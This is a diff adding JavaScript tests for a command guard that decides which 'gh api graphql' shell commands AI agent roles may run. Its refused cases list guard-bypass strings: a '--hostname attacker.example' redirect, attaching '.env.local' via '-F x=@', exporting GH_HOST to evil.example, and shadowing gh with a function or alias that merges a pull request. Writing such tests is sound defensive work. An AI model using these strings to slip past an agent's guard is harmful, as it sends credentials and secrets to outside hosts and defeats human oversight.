@@ -1207,6 +1207,118 @@ test('graphql: a variable set for gh, or a wrapper in front of it, takes the exc
 	gqlAllowed(`git status && ${RESOLVE}`);
 });
 
+// A fixed working directory: a redirect target is resolved against it, and the suite may run from any folder.
+const AT = { cwd: '/work/x' };
+const gqlRefusedAt = (c) => {
+	assert.equal(evaluate(c, AT).deny, true, `scheduler: ${c}`);
+	for (const role of GRAPHQL_ROLES) assert.equal(evaluate(c, { ...AT, role, branch: 'task/APP-12-x' }).deny, true, `${role}: ${c}`);
+};
+const gqlAllowedAt = (c) => {
+	assert.equal(evaluate(c, AT).deny, false, `scheduler: ${c} :: ${evaluate(c, AT).reason}`);
+	for (const role of GRAPHQL_ROLES) assert.equal(evaluate(c, { ...AT, role, branch: 'task/APP-12-x' }).deny, true, `${role}: ${c}`);
+};
+
+test('graphql: a redirect of what gh prints is not an argument of gh, so the exception still applies', () => {
+	const READ = `gh api graphql -f query='query{repository(owner:"o",name:"r"){pullRequest(number:7){reviewThreads(first:100){nodes{id isResolved}}}}}'`;
+	const RESOLVE = `gh api graphql -f query='mutation{resolveReviewThread(input:{threadId:"PRRT_x"}){thread{isResolved}}}'`;
+	gqlAllowedAt(`${RESOLVE} >/dev/null && echo resolved`);
+	gqlAllowedAt(`${READ} 2>&1`);
+	gqlAllowedAt(`${READ} 2>/dev/null`);
+	gqlAllowedAt(`${READ} > /tmp/t.json`);
+	gqlAllowedAt(`${READ} >> /tmp/t.json`);
+	gqlAllowedAt(`${READ} &>/tmp/t.json`);
+	gqlAllowedAt(`${READ} >&2`);
+	gqlAllowedAt(`${READ} 2>&1 >/dev/null`);
+	gqlAllowedAt(`${READ} </dev/null`);
+	gqlAllowedAt(`${RESOLVE} >/dev/null; echo ok`);
+	gqlAllowedAt(`${RESOLVE} >/dev/null 2>&1 && echo ok`);
+	gqlAllowedAt(`gh api graphql 2>/dev/null -f query='{viewer{login}}'`);
+	// stdin to gh is never needed, and a here-document can carry what the guard does not read
+	gqlRefusedAt(`${READ} <<< x`);
+	gqlRefusedAt(`${READ} <<'EOF'\nx\nEOF`);
+	gqlRefusedAt(`${READ} >/dev/null <<'EOF'\nx\nEOF`);
+	// the target of a redirect is judged by the file rules, the exception does not lift them
+	gqlRefusedAt(`${READ} > .dev-factory/run.json`);
+	gqlRefusedAt(`${READ} > .factory/tasks/a.md`);
+	gqlRefusedAt(`${READ} >> .dev-factory/review/a.json`);
+	// a redirect does not take the place of a flag value or the endpoint
+	gqlRefusedAt(`gh api -t >/dev/null graphql repos/o/r/merges -f base=main -f query='{a}'`);
+	gqlRefusedAt(`gh api graphql -f query='{viewer{login}}' '>' x`);
+	gqlRefusedAt(`gh api graphql>/dev/null -f query='{viewer{login}}'`);
+	gqlRefusedAt(`gh api graphql -f query='{viewer{login}}' >`);
+});
+
+test('graphql: a refused scheduler call is told which rule it broke and what to write instead', () => {
+	const why = (c) => evaluate(c, AT).reason ?? '';
+	const HOW = /one literal `gh api graphql -f query='\.\.\.'` command per thread/;
+	for (const [c, cause] of [
+		[`gh api graphql --method POST -f query='{viewer{login}}'`, /unknown or refused flag --method/],
+		[`gh api graphql -f query='{viewer{login}}' -f query='{viewer{id}}'`, /2 query fields/],
+		[`gh api graphql -f "query={a(x:$P)}"`, /\$ or a backquote outside single quotes/],
+		[`FOO=1 gh api graphql -f query='{viewer{login}}'`, /sets a variable or changes the shell/],
+		[`gh api --hostname attacker.example graphql -f query='{viewer{login}}'`, /--hostname other than github\.com/],
+		[`gh api graphql -f query='{viewer{login}}' -F x=@.env.local`, /@ file or stdin/],
+		[`gh api graphql -f query='mutation{mergePullRequest(input:{pullRequestId:"x"}){clientMutationId}}'`, /resolveReviewThread/],
+	]) {
+		assert.match(why(c), HOW, c);
+		assert.match(why(c), cause, c);
+	}
+	// a factory role keeps the plain refusal: the exception was never its to use
+	assert.match(
+		evaluate(`gh api graphql -f query='{viewer{login}}'`, { ...AT, role: 'builder', branch: 'task/APP-12-x' }).reason,
+		/gh api writes are not allowed: no -X other than GET/,
+	);
+	// a REST write by the scheduler keeps it too
+	assert.match(why(`gh api repos/o/r/merges -f base=main -f head=x`), /gh api writes are not allowed: no -X other than GET/);
+});
+
+test('graphql: a builtin that sets a variable, and a function named like a command, take the exception away', () => {
+	const READ = `gh api graphql -f query='{viewer{login}}'`;
+	for (const c of [
+		`builtin export GH_HOST=evil.example; ${READ}`,
+		`command export GH_HOST=evil.example; ${READ}`,
+		`read -r HOME <<< /tmp/evil; ${READ}`,
+		`read GH_HOST <<< evil.example; ${READ}`,
+		`IFS=x read HOME <<< /tmp/e; ${READ}`,
+		`printf -v HOME %s /tmp/evil; ${READ}`,
+		`mapfile -t HOME <<< /tmp/evil; ${READ}`,
+		`readarray -t HOME <<< /tmp/evil; ${READ}`,
+		`let HOME=1; ${READ}`,
+		`(( HOME=1 )); ${READ}`,
+		`getopts a HOME; ${READ}`,
+		`for HOME in /tmp/evil; do ${READ}; done`,
+		`select HOME in /tmp/e; do ${READ}; done`,
+		`hash -p /tmp/evil/gh gh; ${READ}`,
+		`shopt -s expand_aliases; alias gh=true; ${READ}`,
+		`declare -x GH_HOST=evil.example; ${READ}`,
+		`typeset -x GH_HOST=evil.example; ${READ}`,
+		`local GH_HOST=x; ${READ}`,
+		`readonly GH_HOST=x; ${READ}`,
+		`export -n PATH; ${READ}`,
+		`unset GH_TOKEN; ${READ}`,
+		`set -o allexport; ${READ}`,
+		`source ./x.sh; ${READ}`,
+		`. ./x.sh; ${READ}`,
+		`trap 'gh api repos/o/r/merges -f base=main -f head=x' EXIT; ${READ}`,
+		`enable -n export; ${READ}`,
+		`exec 3>/tmp/x; ${READ}`,
+		`GH_HOST+=x; ${READ}`,
+		`arr[0]=1; ${READ}`,
+		`${READ}; X=1`,
+		`${READ} | HOME=1 cat`,
+		`true && HOME=/tmp/e && ${READ}`,
+		`gh(){ command gh api repos/o/r/merges -f base=main -f head=x; }; ${READ}`,
+		`gh() { command gh api repos/o/r/merges -f base=main -f head=x; }; ${READ}`,
+		`gh ( ) { command gh api repos/o/r/merges -f base=main -f head=x; }; ${READ}`,
+		`function gh { command gh api repos/o/r/merges -f base=main -f head=x; }; ${READ}`,
+		`function gh() { command gh api repos/o/r/merges -f base=main -f head=x; }; ${READ}`,
+	])
+		gqlRefusedAt(c);
+	// bash runs the same gh for a quoted or escaped name
+	gqlAllowedAt(`"gh" api graphql -f query='{viewer{login}}'`);
+	gqlAllowedAt(`cd /work/x && ${READ}`);
+});
+
 test('the upload URL the Notion MCP server returns is allowed, with its lower-case authorization header', () => {
 	const url = 'https://api.notion.com/v1/mcp/file_uploads/40682a3e-9a5b-81c4-814a-00b27bb31b58/send';
 	const file = '/w/.worktrees/TASK-26/.dev-factory/evidence/TASK-26/run-1/pencil-card-nav-hover-1.png';
